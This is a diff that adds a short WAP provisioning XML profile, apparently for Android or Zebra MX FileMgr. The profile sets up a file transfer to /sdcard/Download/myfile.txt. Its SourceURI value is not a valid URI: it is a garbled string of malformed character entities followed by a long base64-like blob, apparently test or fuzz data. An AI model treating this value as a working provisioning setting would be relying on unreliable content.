@@ -1,0 +1,12 @@
+﻿<wap-provisioningdoc>
+  <characteristic version="10.1" type="FileMgr">
+    <parm name="FileAction" value="1" />
+    <characteristic type="file-details">
+      <parm name="TargetAccessMethod" value="2" />
+      <parm name="TargetPathAndFileName" value="/sdcard/Download/myfile.txt" />
+      <parm name="IfDuplicate" value="1" />
+      <parm name="SourceAccessMethod" value="1" />
+      <parm name="SourceURI" value="&amp;#1272&amp;#127bgrch5q5J4ZQyTVHVyqYLxJDBvkL1QyZ0dxy9Gc4/fIuemZTrwD0T+D2dvsndyx2gMx0uMXoxgJxl/a0HttVXH//fcqSTqPd10vAVUpzOImZpUTRK85o+4UvNSPou3sRyQtCWXnld8DoyZlPmqkdgosYhIyuKHD0EQsY24eioqMMbRMfHwh+VoB+9c0sKdXiMt9YZoX199W+h3SNFJ5RMtp2r5URPIxy5s+M07DJDLOroacOq97RbecldY0MgSejgJLIjCz39y98lMqlUbg+oalMjYumEOs+X2UWZOUkrT1xnWoGUcls4NLQCgL+lQ4fOwdhHY0x1jyauJjldiX+1Q==" />
+    </characteristic>
+  </characteristic>
+</wap-provisioningdoc>
